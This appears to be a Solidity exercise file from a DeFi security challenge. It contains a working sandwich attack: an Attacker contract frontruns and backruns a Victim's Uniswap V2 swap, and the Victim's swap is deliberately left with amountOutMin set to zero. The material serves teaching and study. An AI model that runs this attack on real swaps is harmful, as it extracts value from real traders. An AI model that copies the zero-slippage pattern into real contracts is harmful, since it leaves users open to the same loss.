// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./interfaces/IERC20.sol";
import "./interfaces/IUniswapV2Pair.sol";
import {console2} from "forge-std/Test.sol";

/**
 *
 *  SANDWICH ATTACK AGAINST A SWAP TRANSACTION
 *
 * We have two contracts: Victim and Attacker. Both contracts have an initial balance of 1000 WETH. The Victim contract
 * will swap 1000 WETH for USDC, setting amountOutMin = 0.
 * The challenge is use the Attacker contract to perform a sandwich attack on the victim's
 * transaction to make profit.
 *
 */
contract Attacker {
    address public constant pool = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    // This function will be called before the victim's transaction.
    function frontrun(
        address router,
        address weth,
        address usdc,
        uint256 deadline
    ) public {
        // your code here

        // buy the USDC token before the victim's transaction
        // path
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = usdc;
        // get the reserve of USDC in the pool
        (uint256 reserveOut, uint256 reserveIn, ) = IUniswapV2Pair(pool)
            .getReserves();

        // calculat the exact amount of USD to buy for 1000 WETH
        uint256 amountInWithFee = 1000 * 1e18 * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;

        uint256 amountOutMin = numerator / denominator;
        console2.log("amountOutMin: %d", amountOutMin);

        IERC20(weth).approve(router, 1000 * 1e18);
        IUniswapV2Router(router).swapExactTokensForTokens(
            1000 * 1e18,
            amountOutMin,
            path,
            address(this),
            deadline
        );
    }

    // This function will be called after the victim's transaction.
    function backrun(
        address router,
        address weth,
        address usdc,
        uint256 deadline
    ) public {
        // sell the USDC token after the victim's transaction

        // get the reserve of USDC in the pool
        (uint256 reserveIn, uint256 reserveOut, ) = IUniswapV2Pair(pool)
            .getReserves();

        address[] memory path = new address[](2);
        path[0] = usdc;
        path[1] = weth;

        uint256 amountIn = IERC20(usdc).balanceOf(address(this));

        console2.log("[backrun] amountIn: %d", amountIn);

        // calculat the exact amount of USD to buy for 1000 WETH
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;

        uint256 amountOutMin = numerator / denominator;
        console2.log("[backrun] amountOutMin: %d", amountOutMin);

        IERC20(usdc).approve(router, amountIn);
        IUniswapV2Router(router).swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            address(this),
            deadline
        );
    }
}

contract Victim {
    address public immutable router;

    constructor(address _router) {
        router = _router;
    }

    function performSwap(address[] calldata path, uint256 deadline) public {
        IUniswapV2Router(router).swapExactTokensForTokens(
            1000 * 1e18,
            0,
            path,
            address(this),
            deadline
        );
    }
}

interface IUniswapV2Router {
    /**
     *     amountIn: the amount to use for swap.
     *     amountOutMin: the minimum amount of output tokens that must be received for the transaction not to revert.
     *     path: an array of token addresses. In our case, WETH and USDC.
     *     to: recipient address to receive the liquidity tokens.
     *     deadline: timestamp after which the transaction will revert.
     */
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}
